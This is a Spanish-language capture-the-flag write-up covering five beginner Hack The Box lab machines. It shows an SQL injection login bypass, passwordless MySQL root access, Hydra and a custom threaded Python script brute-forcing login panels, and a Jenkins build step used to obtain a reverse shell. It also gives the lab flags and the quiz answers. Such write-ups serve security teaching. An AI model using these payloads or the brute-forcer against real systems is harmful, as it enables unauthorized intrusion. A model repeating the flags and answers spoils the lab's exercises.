
---
title: Tier 1 Starting Point Machines (Hack The Box)
author: J0lm3d0
date: 2022-02-08 21:00:00 +0200
categories: [HackTheBox]
tags: [linux, ]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de las máquinas de Tier 1 del "Starting Point" de la plataforma HackTheBox. Se trata de máquinas tanto Windows como Linux, que tienen una dificultad muy fácil de resolución y están orientadas a la gente que está en proceso de aprendizaje de técnicas básicas de explotación.

<!-- [Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_SP_Tier_1.pdf) -->

## MÁQUINA APPOINTMENT

### Enumeración de servicios y recopilación de información sensible

Realizo un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- -T5 -vv 10.129.48.138

Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, utilizo las flags -sC y -sV para aplicar scripts básicos de enumeración e intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```
# nmap -p80 -sCV 10.129.48.138

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
```

Solo encuentro el puerto 80 abierto y, por lo que trato de acceder al servidor web a través del navegador, encontrandome con un panel login. Al igual que en el caso anterior, pruebo credenciales por defecto como, por ejemplo, admin:admin o admin:password, pero no da resultado. Antes de probar con fuerza bruta, pruebo a realizar algunas inyecciones como, por ejemplo, una inyección SQL.

SQL es un lenguaje de consultas que se emplea para manejar la información en la mayoría de bases de datos relacionales. En la mayoría de ocasiones, las validaciones de usuario y contraseña en los paneles login se realizan accediendo a un servidor de bases de datos y comprobando que la información es correcta. En algunos casos, si el código del servidor no está sanitizado, podemos inyectar código SQL en los campos y modificar la consulta a nuestro antojo, permitiendonos así burlar el panel de inicio de sesión y/u obtener información de la base de datos.

Pongamos como ejemplo que la consulta que se está tramitando al servidor de bases de datos es la siguiente:

```
SELECT * FROM users where username='<user>' and password='<password>';
```

En este caso, "\<user\>" sería el nombre de usuario introducido en el campo correspondiente del panel login, al igual que "\<password\>" sería el valor de la contraseña. Por tanto, si inyectamos la cadena "' or 1=1 -- -" en el campo de nombre de usuario y cualquier cosa en el campo de la contraseña, la consulta quedaría tal que así:

```
SELECT * FROM users where username = '' or 1=1 -- -' and password = 'test'
```

![Inyección SQL](/assets/img/HTB/Appointment/sqli.png)

En MySQL, los dos guiones representan un comentario, por lo que todo lo que hay a la derecha queda descartado. En esta consulta vemos que el nombre de usuario queda vacío, pero contamos con un operador OR, por lo que para acceder solo tienen que cumplirse una de las siguientes condiciones:

- Que exista un usuario cuyo nombre de usuario sea una cadena de texto vacía, lo cual es imposible.
- Que 1 sea igual a 1, lo cual es siempre verdadero.

Por tanto, si el código no está sanitizado y la inyección da resultado, lograremos burlar el panel de login. En el caso de esta máquina, la inyección funciona correctamente y, una vez burlado el panel, se nos muestra la flag:

![Flag de la máquina Appointment](/assets/img/HTB/Appointment/flag.png)

### Cuestionario

1. *What does the acronym SQL stand for?* (¿Qué significan las siglas SQL?)

    Structured Query Language (Lenguaje de Consulta Estructurado)

2. *What is one of the most common type of SQL vulnerabilities?* (¿Cuál es uno de los tipos más comunes de vulnerabilidades de SQL?)

    SQL injection (Inyección SQL)

3. *What does PII stand for?* (¿Qué significan las siglas PII?)

    Personally Identifiable Information (Información de Identificación Personal)

4. *What does the OWASP Top 10 list name the classification for this vulnerability?* (¿Como nombra la lista OWASP Top 10 la clasificación para esta vulnerabilidad?)

    A03:2021-Injection

5. *What service and version are running on port 80 of the target?* (¿Que servicio y versión está ejecutándose en el puerto 80 del objetivo?)

    Apache httpd 2.4.38 ((Debian))

6. *What is the standard port used for the HTTPS protocol?* (¿Cuál es el puerto estándar utilizado para el protocolo HTTPS?)

    443

7. *What is one luck-based method of exploiting login pages?* (¿Cuál es uno de los métodos basados en suerte utilizado para la explotación de paneles de inicio de sesión?)

    Brute-forcing (Fuerza bruta)

8. *What is a folder called in web-application terminology?* (¿Como se llama a una carpeta en terminología de aplicaciones web?)

    Directory (Directorio)

9. *What response code is given for "Not Found" errors?* (¿Qué codigo de respuesta se da en los errores "No encontrado/a"?)

    404

10. *What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?* (¿Qué "switch" utilizamos para especificar en gobuster que queremos realizar una búsqueda de directorios y no de subdominios?)

    dir

11. *What symbol do we use to comment out parts of the code?* (¿Qué símbolo solemos utilizar para commentar partes del código?)

    \#

## MÁQUINA SEQUEL

### Enumeración de servicios y recopilación de información sensible

Realizo un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- -T5 -vv 10.129.107.33

Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 63
```

Veo que el puerto 3306 de `MySQL` está abierto, por lo que utilizo las flags -sC y -sV para aplicar scripts básicos de enumeración e intentar conocer la versión que se está ejecutando.

```
# nmap -p3306 -sCV -oN enumPorts 10.129.107.33

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsCompression, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, ODBCClient, ConnectWithDatabase, SupportsLoadDataLocal, IgnoreSigpipes, InteractiveClient, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: EFo}G)4j;&M2Ow*iSE=B
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
```

Como solo existe este puerto abierto y no tenemos credenciales, intento conectarme con usuarios por defecto (admin, root...) sin proporcionar contraseña.

```
$ mysql -uadmin -h 10.129.107.33
ERROR 1045 (28000): Access denied for user 'admin'@'10.10.14.61' (using password: NO)


$ mysql -uroot -h 10.129.107.33
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 81
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Como se puede ver, consigo conectarme al servicio MySQL utilizando el usuario "root" y sin proporcionar contraseña. Una vez dentro, listo las bases de datos y veo que existe una base de datos "htb", además de las 3 por defecto: "information_schema", "mysql" y "performance_schema". Por tanto, indico que quiero utilizar la base de datos "htb" con el comando `use` y, con `show tables`, obtengo las tablas que componen la base de datos: "config" y "users".

```
MariaDB [(none)]> show databases;
+--------------------+                                  
| Database           |                                  
+--------------------+                                  
| htb                |                                  
| information_schema |                                  
| mysql              |                                  
| performance_schema |                                  
+--------------------+                                  
4 rows in set (0.061 sec)

MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed                                              
MariaDB [htb]> show tables;                                   
+---------------+                                       
| Tables_in_htb |                                       
+---------------+                                       
| config        |
| users         |                                   
+---------------+
2 rows in set (0.054 sec)
```

Mediante el comando `describe` listo las columnas que componen cada tabla y el tipo de valor que contienen. Además, con `select *` obtengo todos los registros que componen las tablas, encontrandome el valor de la flag en la tabla "config".

```
MariaDB [htb]> describe users;
+----------+---------------------+------+-----+---------+----------------+
| Field    | Type                | Null | Key | Default | Extra          |
+----------+---------------------+------+-----+---------+----------------+
| id       | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| username | text                | YES  |     | NULL    |                |
| email    | text                | YES  |     | NULL    |                |
+----------+---------------------+------+-----+---------+----------------+
3 rows in set (0.060 sec)

MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.063 sec)



MariaDB [htb]> describe config;
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
3 rows in set (0.055 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.054 sec)
```

### Cuestionario

1. *What does the acronym SQL stand for?* (¿Qué significan las siglas SQL?)

    Structured Query Language (Lenguaje de Consulta Estructurado)

2. *During our scan, which port running mysql do we find?* (Durante nuestro escaneo, ¿qué puerto encontramos que está ejecutando mysql?)

    3306

3. *What community-developed MySQL version is the target running?* (¿Qué versión de MySQL desarrollada por la comunidad está ejecutando el objetivo?)

    MariaDB

4. *What switch do we need to use in order to specify a login username for the MySQL service?* (¿Qué “switch” necesitamos utilizar para especificar el nombre de usuario para acceder al servicio MySQL?)

    -u

5. *Which username allows us to log into MariaDB without providing a password?* (¿Qué nombre de usuario nos permite acceder a MariaDB sin proporcionar una contraseña?)

    root

6. *What symbol can we use to specify within the query that we want to display eveything inside a table?* (¿Qué simbolo podemos usar para especificar en la consulta que queremos mostrar todos los datos de una tabla?)

    *

7. *What symbol do we need to end each query with?* (¿Que símbolo necesitamos para finalizar cada consulta?)

    ;

## MÁQUINA CROCODILE

### Enumeración de servicios y recopilación de información sensible

Escaneo todo el rango de puertos TCP utilizando la herramienta `Nmap`.

```
# nmap -p- -T5 -vv 10.129.111.234

Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Una vez obtengo los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```
# nmap -p21,80 -sCV 10.129.111.234

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix
```

Como se puede ver en este segundo escaneo, el servicio FTP tiene el login anónimo habilitado y presenta 2 ficheros en el directorio compartido: "allowed.userlist" y "allowed.userlist.passwd". Por tanto, comenzamos accediendo al servicio FTP utilizando el usuario "anonymous" y sin proporcionar contraseña y descargamos los archivos en nuestra máquina.

```
# ftp 10.129.111.234

Connected to 10.129.111.234.
220 (vsFTPd 3.0.3)
Name (10.129.111.234:j0lm3d0): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (17.3168 kB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0.00 secs (1.5980 MB/s)
```

Como no hay mucho más que hacer en el servicio FTP, paso a enumerar el servicio HTTP, comenzando por ver el contenido en el navegador:

![Página principal del servidor web](/assets/img/HTB/Crocodile/mainpage.png)

Las pestañas de arriba corresponden a enlaces a las secciones que se encuentran más abajo en la página principal y los botones “Get Started” y “Download” no son funcionales, por lo que no puedo hacer gran cosa. Es por ello que pruebo a realizar una búsqueda de rutas ocultas utilizando `Gobuster`:

```
# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 80 -r -u http://10.129.111.234

/assets               (Status: 200) [Size: 1706]
/css                  (Status: 200) [Size: 1353]
/dashboard            (Status: 200) [Size: 1577]
/fonts                (Status: 200) [Size: 1971]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 200) [Size: 1141]
/server-status        (Status: 403) [Size: 279]
```

De los resultados obtenidos, el que más me llama la atención es "/dashboard", por lo que accedo a esta ruta y veo el siguiente panel de login:

![Panel login en la página "/dashboard" del servidor web](/assets/img/HTB/Crocodile/dashboardpage.png)

Al ver el panel, se me ocurre probar los usuarios y contraseñas de los listados que obtuve previamente a través del servicio FTP. Pero, para automatizar un ataque de fuerza bruta al panel, necesito ver que mensaje de error me muestra al introducir credenciales inválidas, por lo que pruebo a introducir unas credenciales aleatorias y obtengo el siguiente mensaje de error:

![Mensaje de error al introducir credenciales inválidas](/assets/img/HTB/Crocodile/incorrectcredentials.png)

Con esto, ya puedo automatizar un ataque de fuerza bruta utilizando, por ejemplo, la herramienta `Hydra`.

```
# hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.111.234 http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect information."
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-16 19:15:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://10.129.111.234:80/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect information.
[80][http-post-form] host: 10.129.111.234   login: admin   password: rKXM59ESxesUFHAd
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-16 19:15:55
```

Una vez obtengo las credenciales, me autentico en el panel y accedo a los servicios internos, donde visualizo la flag de la máquina:

![Flag de la máquina](/assets/img/HTB/Crocodile/flag.png)

### Cuestionario

1. *What nmap scanning switch employs the use of default scripts during a scan?* (¿Qué “switch” empleamos en nmap para utilizar scripts por defecto durante un escaneo?)

    -sC

2. *What service version is found to be running on port 21?* (¿Qué versión del servicio se encuentra ejecutándose en el puerto 21?)

    vsftpd 3.0.3

3. *What FTP code is returned to us for the "Anonymous FTP login allowed" message?* (¿Qué código FTP nos devuelve el mensaje “Login FTP anónimo permitido”?)

    230

4. *What command can we use to download the files we find on the FTP server?* (¿Qué comando podemos utilizar para descargar los archivos que encontramos en el servidor FTP?)

    get

5. *What is one of the higher-privilege sounding usernames in the list we retrieved?* (¿Cuál es uno de los nombres de usuario con privilegios más altos que se ven en la lista que recuperamos? )

    admin

6. *What version of Apache HTTP Server is running on the target host?* (¿Qué versión del servidor Apache de HTTP está ejecutandose en la máquina objetivo?)

    2.4.41

7. *What is the name of a handy web site analysis plug-in we can install in our browser?* (¿Cúal es el nombre de un útil complemento de análisis de sitios web que podemos instalar en nuestro navegador? )

    Wappalyzer

8. *What switch can we use with gobuster to specify we are looking for specific filetypes?* (¿Qué “switch” podemos usar con gobuster para especificar que estamos buscando unos tipos de archivos específicos?)

    -x

9. *What file have we found that can provide us a foothold on the target?* (¿Qué archivo encontramos que puede proporcionarnos un punto de apoyo en nuestro ataque al objetivo?)

    login.php

## MÁQUINA IGNITION

### Enumeración de servicios y recopilación de información sensible

Para comenzar, realizo un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- -T5 -vv 10.129.106.238

Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Tras este primer escaneo, veo que solo se encuentra abierto el puerto 80. Ahora, realizo un segundo escaneo utilizando las flags -sC y -sV para aplicar scripts básicos de enumeración e intentar conocer la versión y servicio que se está ejecutando en el puerto descubierto.

```
# nmap -p80 -sCV -oN enumPorts 10.129.106.238

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Did not follow redirect to http://ignition.htb/
|_http-server-header: nginx/1.14.2
```

Gracias al script "http-title" de *Nmap* que muestra el título de la página web que se obtiene al realizar una petición HTTP a la IP de la máquina, veo que no se ha podido redirigir al dominio "ignition.htb", por lo que parece que se está aplicando "Virtual Hosting", que se trata de una técnica que permite tener una cantidad variable de dominios y sitios web en una misma máquina. Para poder acceder a este dominio, es necesario indicar que dicho dominio corresponde a la IP de la máquina. Para ello, se debe añadir la siguiente línea al fichero /etc/hosts:

```
10.129.106.238  ignition.htb
```

Una vez realizado esto, pruebo a acceder al dominio "ignition.htb" a través del navegador, que carga la siguiente página web:

![Página principal del servidor web](/assets/img/HTB/Ignition/mainpage.png)

En la página principal no existe demasiada información, ya que no parece estar aún finalizada. En el pie de página se puede observar que se está utilizando Magento, que es una plataforma de código abierto para comercio electrónico escrita en PHP. No reconozco el significado de LUMA, por lo que en principio, imagino que se trata de la empresa simulada que está utilizando este software para montar una plataforma de comercio online.

Ahora, paso a intentar encontrar rutas ocultas utilizando `Gobuster`:

```
# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 --timeout 30s -r -u http://ignition.htb

/0                    (Status: 200) [Size: 25803]
/admin                (Status: 200) [Size: 7092]
/catalog              (Status: 200) [Size: 25806]
/cms                  (Status: 200) [Size: 25817]
/checkout             (Status: 200) [Size: 26102]
/contact              (Status: 200) [Size: 28673]
/enable-cookies       (Status: 200) [Size: 27176]
/home                 (Status: 200) [Size: 25802]
/Home                 (Status: 200) [Size: 25802]
/index.php            (Status: 200) [Size: 25815]
/rest                 (Status: 400) [Size: 52]   
/robots.txt           (Status: 200) [Size: 1]    
/robots               (Status: 200) [Size: 1]    
/setup                (Status: 200) [Size: 2827]
/soap                 (Status: 200) [Size: 391]  
/wishlist             (Status: 200) [Size: 29945]
```

De las rutas encontradas, la que más me llama la atención a priori es la ruta "/admin", por lo que es la primera a la que accedo para visualizar su contenido. Como se puede ver en la siguiente imagen, nos encontramos con un panel login para acceder a la gestión de Magento.

![Página "/admin" del servidor web](/assets/img/HTB/Ignition/adminpage.png)

Como no he encontrado ningunas credenciales escondidas, comienzo a probar credenciales por defecto (admin:admin, admin:password, admin:qwerty, etc.), consiguiendo acceder con las credenciales **admin:qwerty123**. Una vez dentro, se muestra en el panel la flag de la máquina:

![Flag de la máquina](/assets/img/HTB/Ignition/flag.png)

### Cuestionario

1. *Which service version is found to be running on port 80?* (¿Que versión del servicio se encuentra ejecutándose en el puerto 80?)

    nginx 1.14.2

2. *What is the 3-digit HTTP status code returned when you visit http://{machine IP}/?* (¿Cúal es el código de estado de 3 dígitos de HTTP que nos devuelve al visitar http://<IP_máquina>?)

    302

3. *What is the virtual host name the webpage expects to be accessed by?* (¿Cuál es el nombre del host virtual al que la página espera acceder?)

    ignition.htb

4. *What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs?* (¿Cuál es el camino completo al archivo en sistemas Linux que guarda una lista local de pares IP-Nombre de dominio?)

    /etc/hosts

5. *What is the full URL to the Magento login page?* (¿Cuál es la URL completa de la página de inicio de sesión de Magento?)

    http://ignition.htb/admin

6. *What password provides access as admin to Magento?* (¿Qué contraseña nos permite el acceso como admin a Magento?)

    qwerty123

## MÁQUINA PENNYWORTH

### Enumeración de servicios y recopilación de información sensible

Comienzo realizando un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- -T5 -vv 10.129.88.60

Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 63
```

Tras este primer escaneo, veo que solo se encuentra abierto el puerto 8080. Ahora, realizo un segundo escaneo utilizando las flags -sC y -sV para aplicar scripts básicos de enumeración e intentar conocer la versión y servicio que se está ejecutando en el puerto descubierto.

```
# nmap -p8080 -sCV 10.129.88.60

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
```

Gracias al script "http-robots.txt" que se ejecuta, descubro que existe una ruta "/robots.txt" con una entrada deshabilitada. El fichero "robots.txt" indica a los rastreadores de los buscadores a qué URLs de tu sitio pueden acceder. De esta forma, si tu deshabilitas una ruta de un sitio web utilizando esta técnica, no aparecerá en las búsquedas de Google, Bing, etc., pero no impide que no se pueda acceder a ella si ya se conoce su existencia. Es por esto, que en ocasiones podemos encontrar rutas ocultas en este archivo, sin necesidad de realizar ataques de fuerza bruta con Gobuster u otras herramientas.

Pero, al acceder a la ruta "/robots.txt", compruebo que se está deshabilitando la raíz ("/"), por lo que no encuentro ninguna ruta oculta.

![Contenido del fichero "robots.txt" del servidor web](/assets/img/HTB/Pennyworth/robots.png)

Una vez revisada esta parte, accedo a la página principal del servicio web para visualizar su contenido y compruebo que se está alojando un servicio Jenkins. Este servicio se emplea para ayudar en la automatización de parte del proceso de desarrollo de software.

![Página principal del servidor web](/assets/img/HTB/Pennyworth/mainpage.png)

Como no dispongo de credenciales, intento buscar alguna ruta oculta en el servidor mediante fuerza bruta empleando la herramienta `Gobuster`, pero la búsqueda devuelve un error que indica que, cualquier valor que introduzcamos en la url para fuzzear, nos redirigirá a la página principal.

![Error al intentar realizar fuzzing con Gobuster](/assets/img/HTB/Pennyworth/gobusterfail.png)

Esto podemos comprobarlo intentando acceder a una ruta cualquiera, por ejemplo, "/kldjflkñasdjlfjdsañljfñldjñflkjsañldf" y como se observa en la siguiente imagen, sigo estando en la página principal con el panel login:

![Prueba al introducir ruta aleatoria](/assets/img/HTB/Pennyworth/randompath.png)

Por tanto, como no he podido obtener ninguna ruta ni tengo credenciales, intento logarme con credenciales por defecto, al igual que en la máquina anterior. Pero no consigo acceder, por lo que creo un diccionario personalizado de contraseñas a partir de la extracción de palabras clave (admin, root, password, jenkins) del famoso diccionario "rockyou.txt":

```
# cat /usr/share/wordlists/rockyou.txt | grep "admin" >> passwords.txt
# cat /usr/share/wordlists/rockyou.txt | grep "root" >> passwords.txt
# cat /usr/share/wordlists/rockyou.txt | grep "password" >> passwords.txt
# cat /usr/share/wordlists/rockyou.txt | grep "jenkins" >> passwords.txt
```

También creo un diccionario de usuarios, que corresponde a los usuarios por defecto más comunes en este tipo de servicios web (admin, root, administrator):

```
# cat users.txt                                                         

admin
root
administrator
```

Una vez tengo los diccionarios, lanzo un ataque de fuerza bruta al diccionario mediante la herramienta `Hydra`, tal y como había realizado en la máquina Crocodile anteriormente. Pero, en este caso, cuando se produce un error de credenciales, no muestra un mensaje de error y se mantiene en la misma página, sino que hace una redirección a la ruta "/loginError". Es por este motivo que no podemos utilizar *Hydra* para realizar el ataque, ya que debido a un bug no redirige a ninguna IP (lo podéis encontrar de formá más detallada en esta issue de Github (https://github.com/vanhauser-thc/thc-hydra/issues/259) o realizando un debug en Hydra mediante la flag -d).

Por tanto, creo un script simple de Python para realizar un ataque. Para una mayor rapidez en el ataque, el script trabaja con hilos de tal forma que divide el número de usuarios entre la cantidad de hilos con los que se quiere trabajar. En este caso, al haber solo 3 usuarios, daría igual que pusiesemos más hilos, solo trabajará con 3. Si, por ejemplo, tuviesemos 16 usuarios y quisieramos trabajar con 10 hilos, se repartirían de forma equitativa, quedando los 6 primeros hilos con 2 usuarios y los 4 restantes con 1 usuario.

```python
#!/usr/bin/python3

import sys, requests, threading, pwn, time

#Global variables
n_threads = 10
user_list = []
pass_list = []
divided_list = []
t_list = []
login_url = "http://10.129.84.21:8080/j_spring_security_check"
initial_time = 0
end_time = 0

#Lock
password_found = False

#Store the user dictionary in a list
f = open("users.txt", "r")
[user_list.append(p.replace("\n","")) for p in f]
user_list.reverse()
f.close()

def makeRequest(user_list):

	global password_found
	while len(user_list) > 0:
		user = user_list.pop()
		f = open("passwords.txt", "r")
		[pass_list.append(p.replace("\n","")) for p in f]
		pass_list.reverse()
		f.close()
		while len(pass_list) > 0:
			passwd = pass_list.pop()
			data = {
	 			'j_username': user,
				 'j_password': passwd,
				 'from': "/",
				 'Submit': "Sign+in"
			}
			r = requests.post(login_url, data=data)
			if not password_found:
				if "Invalid username" not in r.text:
					print("[+] Credentials found -> %s:%s" % (user,passwd))
					password_found = True
					end_time = time.time() - initial_time
					end_mins = int(end_time / 60)
					end_secs = int(end_time % 60)
					print("[+] Time elapsed: %s min %s s" % (end_mins,end_secs))
			else:
				return
if __name__ == '__main__':

	initial_time = time.time()
	# Initialize the list of lists
	for i in range(n_threads):
		divided_list.append([])
	if len(user_list) > n_threads:
    		n_treads = len(user_list)

	# Divide the user list in the number of threads
	for i in range(len(user_list)):
		if i >= n_threads:
			index = i % n_threads
			divided_list[index].append(user_list[i])
		else:
			divided_list[i].append(user_list[i])

	l1 = pwn.log.progress("Brute Force")
	l1.status("Trying some passwords...")
	for t in range (n_threads):
		try:
			t = threading.Thread(target=makeRequest, args=(divided_list[t],))
			t_list.append(t)
			t.daemon = True
			t.start()
		except Exception as e:
			print("An error has ocurred launching the threads: %s" % e)
	for t in t_list:
		t.join()
	if password_found:
		l1.success("Password found")
```

Tras ejecutar el script, obtengo las credenciales (root:password) en poco menos de 5 minutos.

```
$ python3 jenkins_bruteforcer.py

[+] Brute Force: Password found
[+] Credentials found -> root:password
[+] Time elapsed: 3 min 32 s
```

### Acceso a la máquina

Una vez entramos al panel de administración de Jenkins, podemos ejecutar código para obtener una shell en nuestra máquina de atacante. Para ello, voy a seguir los pasos que nos ofrece la web de HackTricks (https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution):

Selecciono "New Item".

![Paso 1 para conseguir una shell en la máquina víctima](/assets/img/HTB/Pennyworth/newitem.png)

Pongo un nombre al proyecto y selecciono "Freestyle project".

![Paso 2 para conseguir una shell en la máquina víctima](/assets/img/HTB/Pennyworth/freestyleproject.png)

Selecciono la pestaña de "Build" dentro de la configuración (es donde me encuentro nada más crear el proyecto).

![Paso 3 para conseguir una shell en la máquina víctima](/assets/img/HTB/Pennyworth/build.png)

Una vez en la pestaña "Build", clico en "Add build step" > "Execute shell"

![Paso 4 para conseguir una shell en la máquina víctima](/assets/img/HTB/Pennyworth/executeshell.png)

Tras seguir estos pasos, saldrá un cuadro de texto donde hay que escribir el comando que se quiere ejecutar. En este caso será un comando que nos envíe una shell a nuestra máquina de atacante. El envío de la shell puede hacerse a través de múltiples comandos y utilidades que están resumidos en la siguiente web: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet. Yo utilizaré un script que me automatiza el creado de la línea utilizando la interfaz de red y el puerto sobre el que quiero escuchar (este script esta disponible en mi [GitHub](https://github.com/J0lm3d0/Pentesting_Shells-Cheat_Sheet-Script).

![Comandos para lanzar una _reverse_ shell](/assets/img/HTB/Pennyworth/pscs.png)

![Indicamos el comando en el campo de texto](/assets/img/HTB/Pennyworth/command.png)

Una vez hecho esto, hay que guardar los cambios, lo que nos redirigirá a la página principal del proyecto. Una vez ahí, hay que clicar en "Build Now" para que se ejecute el comando definido. Pero antes debemos ponernos a la escucha por el puerto definido para esperar la conexión de la máquina víctima. Esto podemos realizarlo mediante la herramienta `Netcat`, especificando que queremos ponernos a la escucha con la flag -l y el puerto con la flag -p <puerto>:

![Botón que llevará a la ejecución del comando definido](/assets/img/HTB/Pennyworth/buildnow.png)

Al clicar en "Build Now", obtengo la conexión en mi terminal:

![Recepción de la shell](/assets/img/HTB/Pennyworth/access.png)

Como accedo a la máquina directamento como root, tengo libertad total por el sistema. Para finalizar, busco la flag mediante el comando "find" y visualizo su contenido.

```
root@pennyworth:/var/lib/jenkins/workspace/shell# find / -name flag.txt 2>/dev/null
/root/flag.txt
root@pennyworth:/var/lib/jenkins/workspace/shell# cat /root/flag.txt
9cdfb439c7876e703e307864c9167a15
```

### Cuestionario

1. *What does the acronym CVE stand for?* (¿Qué significan las siglas CVE?)

    Common Vulnerabilities and Exposures (Vulnerabilidades y Exposiciones Comunes)

2. *What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?* (¿Qué significan las letras CID, refiriéndose a la tríada CID en ciberseguridad?)

    Confidenciality, Integrity, Availability (Confidencialidad, Integridad, Disponibilidad)

3. *What is the version of the service running on port 8080?* (¿Cuál es la versión del servicio que se está ejecutando en el puerto 8080?)

    Jetty 9.4.39.v20210325

4. *What version of Jenkins is running on the target?* (¿Que versión de Jenkins está utilizando el objetivo?)

    2.289.1

5. *What type of script is accepted as input on the Jenkins Script Console?* (¿Qué tipo de script es aceptado como entrada en la consola de scripts de Jenkins?)

    Groovy

